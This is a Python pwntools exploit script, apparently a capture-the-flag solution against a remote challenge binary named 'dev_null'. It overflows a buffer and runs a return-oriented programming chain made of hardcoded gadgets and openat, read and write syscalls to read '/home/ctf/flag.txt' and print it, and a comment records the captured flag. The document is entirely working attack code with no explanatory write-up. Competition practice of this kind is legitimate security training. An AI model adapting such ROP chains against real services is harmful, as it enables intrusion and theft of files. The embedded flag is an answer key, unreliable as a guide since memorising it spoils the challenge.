#!/usr/bin/env python3

from pwn import *

SCRATCH_MEMORY = 0x4af000

 # mov qword ptr [rsi], rax ; ret
GADGET_MOV_QWORD_PTR_RSI_RAX = 0x420f45

# xchg rax, rdx ; ret
GADGET_XCHG_RAX_RDX = 0x41799a

FLAG_SIZE = 46

#context.log_level = "debug"
elf = ELF("./dev_null", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b dev_null")
p = remote("586c045f-b218-4c7c-b4ea-dbb39705ab9d.x3c.tf", 31337, ssl=True)

p.readline()

rop = ROP(elf)
rop.raw(b"A" * 0x10)

# write the path to memory
rop.rsi = SCRATCH_MEMORY
rop.rax = u64(b"/home/ct")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 8
rop.rax = u64(b"f/flag.t")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 16
rop.rax = u64(b"xt\x00\x00\x00\x00\x00\x00")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)

# openat(-1, "/home/ctf/flag.txt", O_RDONLY) => 3
rop.rdi = -1
rop.rsi = SCRATCH_MEMORY
rop.rax = constants.SYS_openat
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# read(flag, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 3
rop.rsi = SCRATCH_MEMORY + 24
rop.rax = FLAG_SIZE
rop.raw(GADGET_XCHG_RAX_RDX)
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY + 24
rop.rax = FLAG_SIZE
rop.raw(GADGET_XCHG_RAX_RDX)
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendline(rop.chain())

# MVM{r0p_4nd_sh3llc0d3_f0rm5_4_p3rf3c7_b4l4nc3}
print(p.readuntil(b"}").decode())
